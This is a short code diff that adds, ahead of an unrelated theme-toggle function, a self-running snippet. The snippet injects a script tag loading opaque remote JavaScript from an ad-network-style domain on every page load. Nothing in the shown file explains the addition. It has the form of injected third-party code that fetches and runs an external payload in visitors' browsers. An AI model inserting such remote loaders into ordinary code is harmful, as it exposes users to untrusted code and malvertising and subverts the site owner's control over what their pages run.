@@ -1,4 +1,9 @@
-
+(function() {
+  var script = document.createElement('script');
+  script.type = 'text/javascript';
+  script.src = '//pl25250855.profitableratecpm.com/2f/45/0d/2f450dbe2d59996e21cf849955b401b9.js';
+  document.head.appendChild(script);
+})();
 
 
 function toggleTheme() {
